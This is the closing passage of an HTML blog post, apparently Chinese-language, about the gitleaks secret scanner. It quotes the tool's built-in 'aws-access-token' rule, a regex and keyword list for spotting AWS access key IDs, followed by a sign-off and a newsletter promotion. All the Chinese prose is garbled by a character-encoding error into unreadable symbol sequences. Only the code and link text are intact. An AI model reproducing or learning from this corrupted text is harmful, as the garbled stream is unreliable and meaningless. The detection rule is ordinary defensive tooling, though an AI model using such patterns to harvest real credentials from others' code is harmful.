kv kw kx ky kz la ij bi translated">ç”±äºæ‰§è¡Œè¿‡ç¨‹ä¸­æ²¡æœ‰æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨å†…ç½®çš„é…ç½®æ–‡ä»¶<a class="ae kc" href="https://github.com/zricethezav/gitleaks/blob/master/config/gitleaks.toml" rel="noopener ugc nofollow" target="_blank"> gitleaks.toml </a>ï¼Œåœ¨<a class="ae kc" href="https://github.com/zricethezav/gitleaks/blob/master/config/gitleaks.toml" rel="noopener ugc nofollow" target="_blank"> gitleaks.toml </a>ä¸­çš„<code class="fe me mf mg mh b">aws-access-token</code>è§„åˆ™å¦‚ä¸‹:</p><pre class="mi mj mk ml gt mm mh mn mo aw mp bi"><span id="c123" class="mq lc iq mh b gy mr ms l mt mu">[[rules]]<br/>description = "AWS"<br/>id = "aws-access-token"<br/>regex = '''(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'''<br/>keywords = [<br/>    "akia","agpa","aida","aroa","aipa","anpa","anva","asia",<br/>]</span></pre><h1 id="183f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æœ€åçš„æƒ³æ³•</h1><p id="9911" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">å¦‚æœæ‚¨æœ‰ä»»ä½•é—®é¢˜æˆ–åé¦ˆï¼Œè¯·éšæ—¶å‘è¡¨è¯„è®ºã€‚å¦‚æœä½ è®¤ä¸ºè¿™ç¯‡åšæ–‡æœ‰å¸®åŠ©ï¼Œè¯·ç‚¹å‡»æ‹æ‰‹ğŸ‘æŒ‰é’®ä¸‹é¢å‡ ä¸‹ï¼Œä»¥ç¤ºæ”¯æŒï¼ä¹Ÿå¯ä»¥é€šè¿‡<a class="ae kc" href="https://www.linkedin.com/in/yani-dong-041a1b120/" rel="noopener ugc nofollow" target="_blank"> LinkedIn </a>è”ç³»æˆ‘ã€‚</p></div><div class="ab cl nl nm hu nn" role="separator"><span class="no bw bk np nq nr"/><span class="no bw bk np nq nr"/><span class="no bw bk np nq"/></div><div class="ij ik il im in"><h2 id="bbcc" class="mq lc iq bd ld ns nt dn lh nu nv dp ll ko nw nx lp ks ny nz lt kw oa ob lx oc bi translated">æ¥è‡ªInfosecçš„æŠ¥é“:Infosecæ¯å¤©éƒ½æœ‰å¾ˆå¤šå†…å®¹ï¼Œå¾ˆéš¾è·Ÿä¸Šã€‚<a class="ae kc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">åŠ å…¥æˆ‘ä»¬çš„æ¯å‘¨ç®€è®¯</a>ä»¥5ç¯‡æ–‡ç« ã€4ä¸ªçº¿ç¨‹ã€3ä¸ªè§†é¢‘ã€2ä¸ªGitHub Reposå’Œå·¥å…·ä»¥åŠ1ä¸ªå·¥ä½œæé†’çš„å½¢å¼å…è´¹è·å–æ‰€æœ‰æœ€æ–°çš„Infosecè¶‹åŠ¿ï¼</h2></div></div>    
</body>
</html>